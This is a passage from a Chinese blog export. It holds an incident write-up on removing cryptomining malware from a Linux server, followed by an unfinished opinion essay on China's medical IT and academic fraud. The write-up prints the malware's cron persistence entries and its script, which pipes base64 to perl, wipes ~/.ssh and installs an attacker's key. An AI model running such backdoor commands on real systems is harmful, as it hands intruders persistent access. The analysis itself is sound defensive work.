@reboot &#x2F;root&#x2F;.bashtemp&#x2F;a&#x2F;upd&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
5 8 * * 0 &#x2F;root&#x2F;.bashtemp&#x2F;b&#x2F;sync&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
@reboot &#x2F;root&#x2F;.bashtemp&#x2F;b&#x2F;sync&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
0 0 *&#x2F;3 * * &#x2F;tmp&#x2F;.X19-unix&#x2F;.rsync&#x2F;c&#x2F;aptitude&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那个tmp下面有的时候是<code>0 0 */3 * * /tmp/.X21-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</code></p>
<p>这个<code>.X某某-unix</code>应该是想伪装成<code>.X11-unix</code>X11转发的临时文件</p>
<p>root@xi102:~/.bashtemp# ps aux | grep cron root 140526 0.0 0.0 12944 1028 pts/1 S+ 17:16 0:00 grep --color=auto cron</p>
<p>看了一下这个目录下面，有鬼，应该就是它了</p>
<pre class="line-numbers language-none"><code class="language-none">root@xi102:~&#x2F;.bashtemp# ls
a  b  cron.d  dir2.dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>谷歌随手一搜这个.bashtemp，全都是被挖矿的被黑的，先干掉再说 http://blog.itpub.net/31559758/viewspace-2667801/ https://www.anquanke.com/post/id/197662 更新，又看到几个的 http://m.lanhusoft.com/Article/745.html https://yulijia.net/cn/操作系统/2020/03/03/Trojan-attack-analysis.html#fn:2 把这个文件夹拉下来，可以看到里面有个run文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token function">nohup</span> ./stop<span class="token operator">>></span>/dev/null <span class="token operator">&amp;</span>
<span class="token function">sleep</span> <span class="token number">5</span>
<span class="token builtin class-name">echo</span> <span class="token string">"ZXZhbCB1bnBh....这里太长略过..."</span> <span class="token operator">|</span> base64 --decode <span class="token operator">|</span> perl
<span class="token builtin class-name">cd</span> ~ <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf .ssh <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> .ssh <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"ssh-rsa AAAAB3N...
这里一段密钥太长略过...fckr"</span><span class="token operator">>></span>.ssh/authorized_keys <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> -R <span class="token assign-left variable">go</span><span class="token operator">=</span> ~/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的rsa密钥和那一串base64编码的perl脚本太长，单独放出来</p>
<p>rsa：</p>
<pre class="line-numbers language-none"><code class="language-none">AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2&#x2F;9p7+vD0EpZ3Tz&#x2F;+0kX34uAx1RV&#x2F;75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw&#x3D;&#x3D; mdrfckr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>perl脚本（base64解码之后）：</p>
<pre class="line-numbers language-none"><code class="language-none">eval unpack u&#x3D;&gt;q&#123;_&quot;FUY(...中间这一段还是太长略过...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用perl的unpack把后面那一段解包之后还是有900多行，太长了，放到Github gist上了<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a> (按照挖矿佬的风俗是不是应该放到pastebin上？)</p>
<p>我上面放的那两篇文章里的情况和这个几乎一样。大概就是先运行一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnRyZW5kbWljcm8uY29tL3RyZW5kbGFicy1zZWN1cml0eS1pbnRlbGxpZ2VuY2Uvb3V0bGF3LWhhY2tpbmctZ3JvdXBzLWJvdG5ldC1vYnNlcnZlZC1zcHJlYWRpbmctbWluZXItcGVybC1iYXNlZC1iYWNrZG9vci8=">perl的脚本<i class="fa fa-external-link-alt"></i></span>，然后把你的SSH密钥删了，插入它的后门密钥。进程伪装成rsync之类的东西。运行后会在<code>\tmp\</code>下面产生一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9ncy5qdW5pcGVyLm5ldC9lbi11cy90aHJlYXQtcmVzZWFyY2gvZG90YTMtaXMteW91ci1pbnRlcm5ldC1vZi10aGluZ3MtZGV2aWNlLW1vb25saWdodGluZw==">dota3文件<i class="fa fa-external-link-alt"></i></span></p>
<p>看到了一个可疑的欧洲IP：45.9.148.125 和一个可疑的网站：www.minpop.com</p>
<h3 id="后续清理工作">后续清理工作</h3>
<p>干掉定时任务<code>crontab -e</code>,把上面那几条定时任务全删了 删除<code>~/.ssh</code>目录底下可疑的authorized_keys 删除定时任务中的可疑文件夹<code>.bashtemp</code>和<code>.X21-unix</code></p>
<h2 id="注">注</h2>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9pc2lzdGVyLmNjL3Bvc3RzL0ZhaWwyYmFuLUJhc2lj">使用 Fail2Ban 加固你的 Linux 服务器<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS51YnVudHUub3JnLmNuL3ZpZXd0b3BpYy5waHA/Zj0xMjAmYW1wO3Q9MjU3MzMz">细说linux挂载——mount，及其他……<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vQXJjaGFlb3JhcHRvci8wN2RjM2RmZTc0MWEyYzMzMmJmYWRkZWU3ZTk1YjVkOA==">完整的perl脚本<i class="fa fa-external-link-alt"></i></span><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>对于医疗行业的一点看法</title>
    <url>/about-medical-industry/</url>
    <content><![CDATA[<p>半个局外人的流言谶语，以及乌鸦嘴。未完待续，不定期更新。 <a id="more"></a></p>
<p>目前施工进度：35%<br />
大概列个标题，很多大坑比如医疗私有化的问题有空了慢慢填。</p>
<p>当然我不是医学生，当年高考报志愿的时候由于色弱被医学几乎所有专业拒之门外。</p>
<p>虽然本科录取通知书和毕业证上都写的是生物医学工程（是的，这个专业也是色弱与狗不得报考。可我是报了通信电子被调剂过来的），虽然每次出门说出这个专业总被认成是学生物的、学医的，很惭愧，生化相关的就没学过，唯一跟生物沾点边的是大一的必须选的选修课生命科学导论（只有一个学分的选修，上课全程在写微积分线代作业，老师非常善良，开卷考试全程抄书），唯一跟医学沾点边的是大一的解剖（也是选修，两个学分，上课全程在写电分大雾作业，考试划重点精确到第几章第几页第几段的第几个句子）。</p>
<p>本来是想去搞硬件的，本科还在搞医疗器械那会也确实在焊板子弄单片机搞stm32烧串口调测量信号，不过最后还是逃离了医疗器械，当了硬件逃兵。</p>
<p>快要过去的一年发生了不少事，每次想写点什么，打了一堆字又删了，原来的知乎大号早就宣布退乎清空回答了，丁香园小木虫之类的地方又不想去，发到博客没多少人看（以及会有另一些人看，近似于发QQ空间的效果）。</p>
<p>发在这里又不能像某乎那样开个小号再开个匿名，利益相关，匿了.jpg</p>
<p>由于还在坑中+实名网上冲浪，有些东西不会多讲。</p>
<h2 id="现状">现状</h2>
<h3 id="医疗器械">医疗器械</h3>
<p>啊，老本行，拿出来单独说一下（很惭愧，从这一行跑路了）</p>
<p>这里的医疗器械只讲一下电子设备，比如血压血糖体温之类的传感测量设备，还有那些X光机、CT、PETCT、彩超、MRI、NMRI那一堆摆在影像科的昂贵的大设备。用于检测的那些设备没搞过，不懂；医疗耗材之类的完全不懂，听说川大那边有不少搞生物医学材料的，听说强生美敦力罗氏之类的企业在做。</p>
<p>比较贵的那些大设备以前长期处于国外几家大公司垄断中，主要是GPS三家。通用电气一直在没落，飞利浦这两年也有点不思进取，西门子还行，不过这两年逐渐被联影迈瑞蚕食掉不少市场。</p>
<p>国内公司大概就 联影 迈瑞 理邦，这些后面慢慢讲，一时半会讲不完</p>
<p>联影号称是医疗器械行业的华为，实际加班可能比华为还严重；像当年菊花从思科挖人一样，联影从西门子等挖了好多高管和技术人员，从而实现了自主研发。</p>
<p>东软之类的国企现在大都没落了。</p>
<p>国内学校搞医疗器械的不是很多，基本都挂在生物医学工程下面，有的挂在精密仪器和自动化下面（说起来你电生命学院最早就是从自动化测量那边分出去的，早年一群搞医疗器械的，不过后来逐渐都去灌水了，硬件没多少人搞了）。不算材料那些，高校里面还在搞医疗电子并且还算可以的可能就浙大和重庆大学的一些组了(不仅难搞还要投入很多钱还不好发文章，最终一个个都去生化环材或者人工智能识别影像病灶灌水去了)。</p>
<h3 id="医学影像">医学影像</h3>
<p>这个以后再讲。</p>
<h3 id="医学信息">医学信息</h3>
<p>算是正在医学信息的坑里面划水吧，</p>
<p>入坑，你将看到各路祖传机器和祖传代码，包括Delphi，PowerBuilder，SQL Server 2000，远古版本的Windows Server 和 Windows XP（当然，都是盗版的），Oracle（几乎都是远古版本，不少盗版，比较有钱的大医院可能会有正版），偶尔可能还有完美兼容ie的Flash，WebForms； 各种神奇的导出格式，不规范的XML，各种自定义的数据格式和编码（某些公司自己弄出来的私有格式）</p>
<p>各种打着信息化方便服务医护人员和患者旗号的政策把医护人员和患者都折腾的半死。各种灌水论文，各路骗钱公司。。。。</p>
<!-- 国内知名的医疗软件基本都是再用PB,比如金蝶 创业 众阳。也没有互联网软件公司出来革了她们的命 -->
<h4 id="his系统">HIS系统</h4>
<p>略有年头的词。不少HIS系统比我还老，祖传代码没人敢动，去医院转一圈一下你会发现真就是祖传微机祖传服务器祖传软件，不知道多少年前采购的东西用到天荒地老。</p>
<p>有些话我不方便说太多。</p>
<p>这种单位采购的XX系统，大家心里应该都能想象出来。想像不出来的请回忆一下学校选课系统/教务系统支配的恐惧。除了学校学生自己做的选课系统，采购的选课系统基本都是方正、清元、强智。</p>
<p>比如<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI2NTE2MTgw">隔壁西电曾经的清元<i class="fa fa-external-link-alt"></i></span>，比如<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM2MjY2NzcwMQ==">武大这个<i class="fa fa-external-link-alt"></i></span>，当然还有<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI2NDcwNTQ5OS9hbnN3ZXIvMjg0MzkxOTMz">你电这个<i class="fa fa-external-link-alt"></i></span>我大一的时候连续崩溃一周搞得大家半夜起来的神仙选课系统（这可不是高并发抢课，这是用权重投分选课，而且还是各年级分开错峰权重选课）</p>
<p>为什么HIS系统这么难用，和这个问题大致是一样的：</p>
<blockquote>
<p>为什么学校的选课系统、教务系统这么垃圾</p>
</blockquote>
<p>还没用过选课系统的高中生可以看丁香园的这篇吐槽<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>感受一下，医院的HIS系统操作使用起来非常不舒服，被医护人员吐槽是家常便饭的事。不过HIS系统，怎么说呢，全世界就没一个好用的。</p>
<p>用教务选课系统来形容可能会让你们低估HIS系统的难用程度，选课系统最多也就世界上最好的语言PHP+WebForms，新一点的前端可能是jQuery，都还能招到人来维护；而且都是Web版的选课系统。不少选课系统还有在校学生维护，运维和改祖传代码的能力已经吊打医院信息科了。</p>
<p>而且大部分医院都异常执着于采用所谓的C/S架构（狭义的Client/Server，多指能且仅能装在Windos XP上的桌面客户端），非常看不起也不愿意买B/S（Browser/Server,就是Web呗）的东西，认为那都是不安全的东西。 <del>说的好像他们的祖传windows xp多安全一样，不管，反正就是浏览器的东西不安全</del></p>
<p>有的医院倒是想换新的电脑，结果发现以前斥巨资采购的老软件最高只支持Windows XP；换新的HIS系统又拿不出那么多钱，将就着用呗。</p>
<p>采购价格通常很贵，三甲医院买的软件可能基本都几百万甚至上千万吧（有的是吃回扣，有的是花公家的钱不心疼，有的是）</p>
<p>国内的医院大部分是是断网的，是只能上医院内部局域网那种，他们说是为了安全。我悟了，安全全靠断网物理隔离。</p>
<h4 id="电子病历">电子病历</h4>
<h5 id="到底有啥用">到底有啥用</h5>
<p>在处理常见大量重复病情的时候能复制粘贴会比手写快一点。 感觉为数不多的好处可能是不用再面对手写病历和处方上面难以辨认的字了。 但是手写病历自带的最高级别的加密通信也没了。</p>
<p>当医院采购的电子病历软件极其难用的情况下，可能对医生是个负担。经常有医师吐槽用某些电子病历系统比手写还慢，远远不如医生直接用Word写病历。 （废话，Word可是地表最强富文本编辑器之一，能打过Word的东西怕是一只手能数过来）</p>
<h5 id="命名实体识别">命名实体识别</h5>
<p>命名实体识别（Named Entity Recognition），不少人NLP入门的第一个项目。（确实适合入门，NLP不少领域都很难，而这个很简单，而且可以从爬数据、清洗、自己指定规则和标注（标注几百份就能见效），自己构建数据集，选模型调参（简单的模型可以自己从底层实现一遍））</p>
<p>电子病历/医学文献/其他乱七八糟的医学文本，能用来命名实体识别的都被轮过不知道多少次了。实乃广大学子毕业设计水论文居家编论文必备。</p>
<p>从隐马尔科夫模型到SVM到CNN到LSTM到BERT，基本上但凡NLP取得一点进展，就拿来用电子病历做一个命名实体识别，英文做一遍，中文再做一遍。实乃苦命学子水论文毕业的不二法宝。</p>
<p>现在已经非常成熟，BERT的准确率在电子病历上能轻易达到95%，只要喂的语料数据足够多足够好，达到98%也不难。</p>
<p>基本已经没有什么上升空间了。</p>
<h4 id="临床决策">临床决策</h4>
<p>正在搞，以后再讲。跟医学图像那些可以做到准确率超越多年经验的医师不一样，临床决策不管是早年的专家系统、量表、决策树、自动机之类的东西还是后来又火了一阵的机器学习，效果都不太好，跟人类经验比差的太远了。</p>
<h4 id="循证医学rct和meta分析">循证医学、RCT和Meta分析</h4>
<p>循证医学这个东西，非医学人士不要去看它那些概念，现在这个东西跟中医一起同步高频出现。</p>
<p>正经学过数理统计、随机过程、就当作重新发明统计学就好了。</p>
<blockquote>
<p>可能是统计学没学过的老专家想出来的一种 “科学” 研究方法</p>
</blockquote>
<p><strong>如果你听到一个人/媒体整天把循证医学挂在嘴边，先怀疑一下是不是个骗子。就像把AI、人工智能、区块链挂在嘴边的，直接先当成炒作骗子再说。虽然区块链确实是很不错的技术。</strong></p>
<p>比如:</p>
<ol type="1">
<li>国士无双老骗子</li>
</ol>
<blockquote>
<p>"我从事了50多年的临床工作,对中医做得很少.为什么我现在来学习中医?因为经过SARS防治至今十几 年对中医防治流感的临床体会,认识到需要发挥国家战略优势,以独特的医疗思路,模式,方法和要领,把我国的中医药推广到全世界.克强总理说,中国发展的重 要思路是体制驱动创新.我们有很好的传统和精神,中医药也要在新的体制下推动创新.在不久前召开的首届两岸四地中医药循证高峰论坛上,呼吸疾病国家重点实 验室主任,广州医科大学附属第一医院,广州呼吸疾病研究所荣誉所长钟南山院士深有感慨地表示.</p>
</blockquote>
<ol start="2" type="1">
<li>速效救心丸</li>
</ol>
<p><img src="/about-medical-industry/1613013504.png" /></p>
<ol start="3" type="1">
<li>老中医</li>
</ol>
<p><img src="/about-medical-industry/1613014959.png" /></p>
<blockquote>
<p>潘毅老师直播末尾说的：疫情爆发后，全世界只有我们能用中医、西医两种诊疗手段，并且都发挥了很大作用。对比国外只有西医一种诊疗手段，我们能深刻体会到「天佑中华」四字的含义</p>
</blockquote>
<p>以上节选自b站最爱的团团（共青团广州中医药大学委员会）</p>
<p>以上结论是我结合老祖宗千年古籍，经过大样本调查结合人工智能得出的。</p>
<p>如果有人感到被冒犯，那一定是你慧根不足，受到了食品添加剂和化学污染，百年之内必死无疑，快吃点速效救心丸抢救一下，毕竟心主神明。</p>
<blockquote>
<p>被列入中成药临床循证评价证据指数，是对速效救心丸在循证医学层面又一次认可，将为推动速效救心丸高质量研究提供技术支持。</p>
</blockquote>
<h5 id="rct">RCT</h5>
<p>RCT，就是现在初中生物都要学的随机对照试验。</p>
<p>医学实验和生物实验有点区别，</p>
<p><img src="/about-medical-industry/1613013813.png" /></p>
<h5 id="一些来不及做不出来实验的特殊场合">一些来不及/做不出来实验的特殊场合</h5>
<p>正常流程的新药审批和 有些只是来不及等不了，比如去年疫情刚爆发的时候</p>
<h5 id="meta分析">Meta分析</h5>
<p>嗯，Meta分析的名声也快被灌水搞烂了（本来也不怎么好，Meta material之类的带Meta的字眼听着就像灌水）</p>
<p>大概的原理可以看<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI2NDc4OTQ2MC9hbnN3ZXIvMjg2NDY4NDc3">这篇回答<i class="fa fa-external-link-alt"></i></span></p>
<div class="note warning no-icon"><p>Meta分析的论文作者如果没有该领域相关研究成果或者多年临床经验，不妨直接当这篇Meta分析是垃圾灌水</p>
</div>
<p>Meta分析在十几年是灌水的黄金时期，大量灌水文章批量生产。以至于灌到现在，不少单位已经明令不能用Meta分析的文章来评奖和评职称了，灌水都不让灌了。</p>
<p>有固定格式和套路，不需要投入经费和时间做实验，甚至不需要熟悉该领域，也不要懂Meta分析的统计学原理，就可以灌水。</p>
<p>随便一个本科生甚至初中生，完全没有相关领域的知识，临时培训三个月都能弄出一篇Meta分析来，这灌水速度和难度在生物医学这些灌水成风的领域都引起了恐慌，甚至评职称评奖考核不允许Meta分析。</p>
<p>大部分Meta分析的价值可能远不如某领域大牛或有经验医生的采访、回顾总结或综述。</p>
<p>综述类的东西，就应该请该领域的执牛耳者、多年从业人员、一线临床医生或在前沿领域做出突出贡献的人来写</p>
<p><strong>大部分Meta分析的价值，可以作为医学本科生或者研究生《医学文献检索和写作》成绩占比40%的期末作业</strong></p>
<p>如果还要再说点什么，</p>
<p><strong>Meta分析的灌水文章和Uptodate临床指南之间差了10个维基百科</strong></p>
<h3 id="远程医疗">远程医疗</h3>
<p>别让我听到5G+远程医疗了行不行。TMD, 烦死了。</p>
<p>医生做个飞刀被举报了都要罚款，却在吹什么远程医疗。允许病人外地就医，医生可以去外出开飞刀，比什么远程医疗都好。</p>
<h2 id="一些风气">一些风气</h2>
<p>施工中，尚未写完</p>
<h2 id="关于医疗私有化">关于医疗私有化</h2>
<p>这个问题比较复杂，一时半会讲不完，以后再说。 大部分公立医院都有着国企的通病</p>
<p>下面是比较有意思的几个：</p>
<p>宿迁医改</p>
<p>莆田系</p>
<p>爱思眼科</p>
<!-- 奥派喜欢自由市场，不过长远看我们都死了。等不及了，信誉和口碑的建立至少需要二十年，人能有几个二十年？ -->
<h2 id="业界和学界脱节">业界和学界脱节</h2>
<p>大多数工科的教育、学界和业界基本都或多或少脱节，这是全球普遍现象.</p>
<h3 id="学校跟不上行业发展">学校跟不上行业发展</h3>
<p>学生的教材更新慢，实际参与项目的机会也少，不少工科上课只讲PPT，考核也更偏重理论研究。国内很多教科书和讲课方式基本一成不变，一些停滞不前的领域还好。一些发展迅速的领域，从编教材到审批到讲课使用可能有至少五至十年的代差，结果讲的东西几乎都被淘汰了。</p>
<p>CT和磁共振这些设备，学校的科研成果和实力已经和联影迈瑞脱节太远了。</p>
<p>在一些需要大量砸钱投入产品研发的领域，高校甚至很多研究所和企业的差距特别明显。软硬件这些最近几十年发展比较快又比较赚钱的行业尤其明显，学界被远远甩在后面。 （分两种，一种是航天这种几乎不赚钱的；一种是芯片这种能赚钱的）</p>
<p>在大型医疗器械基本被联影和迈瑞甩开太多，国外的学校也和西门子通用电气有巨大的差距。在通信方面，高校和研究所和中兴华为存在代差。在芯片方面，高通英特尔AMD台积电随便拉一个出来都和学校的工艺有代差，紫光和中芯也和象牙塔里的研究有巨大的差距。</p>
<p>这些学界逐渐落后的行业，有学术理想的，可能到业界去是更好的选择。下一个贝尔实验室大概率不会在动作迟缓还没太多钱的学界出现。</p>
<p>钱，主要是钱。哪钱多人去哪。</p>
<h3 id="自娱自乐的科研">自娱自乐的科研</h3>
<p>就喜欢研究些所谓高端和超前的东西，结果实际十年内制造不了、有重大缺陷、成本太高，都没法用。</p>
<p>很多工科已经全面生化环材化了。（不如说是被生化环材凭借高影响因子和发论文快的优势大举入侵）原先在做模拟器件电源的纷纷去搞钙钛矿、石墨烯，原先做射频、电磁场和控制的纷纷去搞深度学习。用钙钛矿做电磁材料，用深度学习搞天线和电路布线，论文发了不少，学术圈玩的挺High,实际效果一塌糊涂。</p>
<h2 id="论文水漫金山">论文水漫金山</h2>
<p>在全球，生化环材等实验研究的灌水和造假都是普遍现象。对该领域抱有幻想、未接触过的推荐阅读以下回答。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQyNTkxMTgzOC9hbnN3ZXIvMTUzMDI4MDMwMg==">如何看待 2019 年诺奖得主塞门扎 30 多篇论文涉嫌 P 图造假、学术不端，是真的翻车了吗？ - 阿诺的回答<i class="fa fa-external-link-alt"></i></span> (这个用户只有这一个回答，约等于匿名，答案1万两千字左右，赞数接近两万。为了防止哪天被b乎獾狸猿删了，备个份：<a href="../uploads/知乎回答.md">回答</a> 同样适用于基础医学领域，或者说，生物医学的实验科研本就是一家。（这里主要指基础医学，临床的科研论文情况稍有不同） 准备入坑基础医学和医学科研的不要再背什么医学誓言了，多看点这种东西。</p>
<p>过气网红王垠几年前写的这个也可以看看，<span class="exturl" data-url="aHR0cDovL3d3dy55aW53YW5nLm9yZy9ibG9nLWNuLzIwMTQvMDMvMjQvYWNhZGVtaWMtY29ycnVwdGlvbg==">学术腐败是历史的必然<i class="fa fa-external-link-alt"></i></span>。王垠在PL界的建树虽然有些争议，当喷子时候的言论还是可以看一下，敢爱敢恨，比某些只会说漂亮话的人强。（不过计算机的科研跟生化环材比起来简直就是冰清玉洁，看王垠的这个会大大低估生化环材药学医学科研的黑暗程度）</p>
<h3 id="科研论文的灌水和学阀的成型">科研论文的灌水和学阀的成型</h3>
<p>博士大规模扩招，基础医学扩招，并不会带来医学科研水平的提升。恰恰相反，科研灌水和造假、急功近利、基础医学毕业像生化环材一样失业、研究内容像钙钛矿一样工业界用不了，都在加剧……</p>
<h4 id="高校和科研院所">高校和科研院所</h4>
<blockquote>
<p>刑不上学部委员</p>
</blockquote>
<p>学阀集团已经形成。前一阵饶毅举报大家也都看到了，图片误用。</p>
<p>当然饶毅自己也https://www.zhihu.com/question/306905936</p>
<p>基础医学正在扩招，大批理工院校和一些原来没有医学院的综合院校开办医学院。</p>
<h4 id="劳苦功高不如论文灌水">劳苦功高不如论文灌水</h4>
<p>之前中科院、工信部、社科院的大学变成教育部直接管之后，基本都变成后娘养的。中国科学院大学整天被教育部排挤，原先工信部的一些学校也是。</p>
<p>前几个月发文说要破除"唯论文论"，很多人在那里担心那不就倒退回举孝廉了吗？有的学科哪怕直接举孝廉也不会比现在更烂了。</p>
<p>论文在很多工程性的领域已经变成了像八股文一样的东西，还是选武状元看八股文。</p>
<h4 id="医院的科研">医院的科研</h4>
<p>以论文作为升值和考核的主要指标，会造成很恶劣的影响。医生的工作是治病，老师的工作是讲课和带学生，然而这些基本不算在评职称考核，主要看论文。 结果认真治病、辛勤工作可能最高也就停留在副主任医师，一点贡献没有整天文章灌水的升值贼快。</p>
<h3 id="企业买通医院和论文">企业买通医院和论文</h3>
<h4 id="研究造假和虚假宣传">研究造假和虚假宣传</h4>
<p>https://zhuanlan.zhihu.com/p/35229540</p>
<p>买通期刊杂志和科研人员</p>
<p>不过大部分情况，只要买通媒体宣传就行了。实在不行再来点水军。</p>
<p>画风是这样的：</p>
<p>找二流报纸之类的权威媒体，已经微信公众号之类的文章，以及电视广告，再写点软文，成了。</p>
<h4 id="医药代理用论文贿赂医院">医药代理用论文贿赂医院</h4>
<p>论文这种评职称和考核的硬通货最适合拿来行贿啦！ 而且比直接打钱送礼隐蔽多了。</p>
<p>怎么说，感觉有的销售也挺惨的。帮医生写论文，帮医生动手术，帮。。。</p>
<h3 id="圣人不死大盗不止">圣人不死，大盗不止</h3>
<p>学术圈至今能被各路期刊和杂志出版商两头赚钱疯狂割韭菜，劝大家还是不要报太大希望。用某人的话说，小资天然的软弱性，庙小妖风大，池浅王八多；用另一种流行的话说，费拉不堪。</p>
<p>学术圈和科研圈一群人整天说着要为人类XX事业做贡献，伟大的科学研究。结果发表个成果要给出版商和期刊交钱，下载个论文想查看个人类共有财产还要给爱思唯尔和知网这些毒瘤交钱。</p>
<p>知网能搞出cajviewer这种毒瘤和caj这种垃圾格式，这么多年骑在科研工作者头上拉屎，在座的各位科研人员都有责任。</p>
<pre class="line-numbers language-none"><code class="language-none">导致学者修饰数据的祸首，回答里已经讲的很清楚了：执行同行评议的学术期刊。解决的方法也给出了：直接在网上发表实验数据。实际上这样的数据库也有类似的出现，例如各类预印本网站。但这些预印本仍然有形式审查，有内容审查，运营模式僵化，这样的发表几乎对传统学术期刊没有施加到任何压力。

真正会威胁到传统学术期刊的平台，应该具备如下特点：

首先，它的名字可以叫做例如Hypothesis in progress&#x2F;in evolution, 其内容格式为先提出一个科学假设、然后上传相应的图片和数据，每一个图片和数据都有相应的原始数据，比如WB要有未剪切的原始的电泳和膜染色图，荧光照片要有未剪切的原片，如果服务器的储存量够大，则把每一组所有照片都要上传，并且指出结果中的图片是选用的哪一组的哪一张。

每一阶段实验完成后，对原始提出的假说进行完善、修改甚至推翻重来，但是不删除最原始的Hypothesis，以完整的呈现该Hypothesis的发展和完善过程。无论何时都允许任何人进行评论，从Hypothesis的创新性到方法学的合理性都可以评论和提出建议，比如是否有其他人已提出类似的假说，或有没有其他方法可以改进其假说，某个实验方法是否不合适等。

在该平台发表的目的是尽最大努力还原出一个研究的整体过程，呈现出研究的原貌，并且最大程度的保证其可重复性。而不是像现有学术器刊物那样，一个研究必须是完美的、要把数据修饰到作者自己都呕吐才可以发表。

每一个研究的影响力应该建立在发表者的理论&#x2F;假设&#x2F;数据在其领域内有多少人使用(注意不是引用)、有多少人利用该理论&#x2F;假设&#x2F;数据发现了新的药靶、开发了新的药物，或者开辟了新的研究领域。研究的评价再也不是根据什么影响因子、什么H因子、什么自然指数(让这些东西都他么的fu*k off！)。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这些年从开源到互联网（www原本的意思），免费开放共享的风气一直没怎么刮进大部分传统行业。不止传统行业，甚至计算机的很多领域都没这个风气。计算机图形学的封闭和计算机视觉突飞猛进形成了强烈的对比。</p>
<p>在医学领域（至少我接触到的国内）小圈子和不开放风气尤重，接受新知识和变化的速度也比较慢，山头和派系林立。 有什么好东西基本都当“祖传秘方”一样藏着，从来就不想着造福全人类，除非发论文或者开公众号吸粉。一副教会徒弟饿死师傅的作风。 有价值的资料除非发论文压榨光之后几乎很少放出来给大家共享，哪怕是去年疫情这种危急时刻，依然各怀鬼胎。</p>
<p>sci-hub程度还不够，要有效果需要像海盗湾那种法外狂徒之类的东西。</p>
<h4 id="何计身后评">何计身后评</h4>
<p>比如这样，医保也没钱了，国家也别花些冤枉钱研究些灌水的东西了。就仿造国外领先的医疗耗材、医疗器械、医药（完全复刻不偷工减料那种），不管他什么专利版权。按打破国外垄断和降价多少的贡献评职称、企业免税，按为国家节省多少进口外汇评奖。药企等过来告侵犯版权？不管，党国千里长城封锁谷歌的壮举都干了还在乎这个。声称这是人类共同财产，把原来的垄断技术直接像全世界公开，不怕师出无名。 啥？扰乱市场秩序，逼得投入研发创新造福病人的医药企业血本无归？长期不利于医学进步？骂名背就背了，反正也不是第一次扰乱市场秩序了，医保都没钱了管它欧美医药企业死活干什么。医疗器械和医药一堆垄断寡头企业，名声本来也不是多好，本来也不是什么自由市场，一时半会亏损不了（挣钱都是上市圈钱，也不怎么靠真业绩）<br />
就现在这样子，经济危机动荡和战时状态十年内到来的概率并不低，该干的先干了再说。党和郭嘉背的黑锅</p>
<!-- 
## 做梦

下面是黄梁美梦时间：

- 工科、医学等本科生取消毕业论文
- 原先归工信部的、卫生部的学校都从教育部还回去
- 李艳红和莆田系该坐牢的坐牢，该枪毙的枪毙
- 喂鸡委相关人员全国公审
- 中药注射液相关人员同上
- 计生干部该还钱，该偿命偿命
 -->
<h2 id="医患关系">医患关系</h2>
<p>网上提到医患关系，经常就在新闻评论区吵起来了。然后一拨人开始骂医生，另一拨人开始骂患者。</p>
<p>这里有必要引入其他的一些重要角色，并对角色做一些细分：</p>
<ul>
<li>新闻媒体</li>
<li>网易新闻等新闻评论区</li>
<li>b乎渣浪豆瓣</li>
<li>丁香园等医学论坛</li>
<li>党国</li>
<li>卫健委</li>
<li>财政部</li>
<li>百度</li>
<li>患者</li>
<li>医护人员</li>
<li>医院</li>
</ul>
<p>然后还要再细分一下</p>
